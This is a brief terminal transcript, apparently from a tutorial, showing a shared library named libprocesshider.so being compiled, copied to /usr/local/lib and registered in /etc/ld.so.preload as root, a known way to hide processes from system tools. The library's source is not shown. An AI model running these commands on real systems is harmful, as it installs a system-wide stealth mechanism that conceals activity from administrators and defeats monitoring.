gianluca@sid:~/hide$ make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
gianluca@sid:~/hide$ sudo mv libprocesshider.so /usr/local/lib/

root@sid:~# echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload


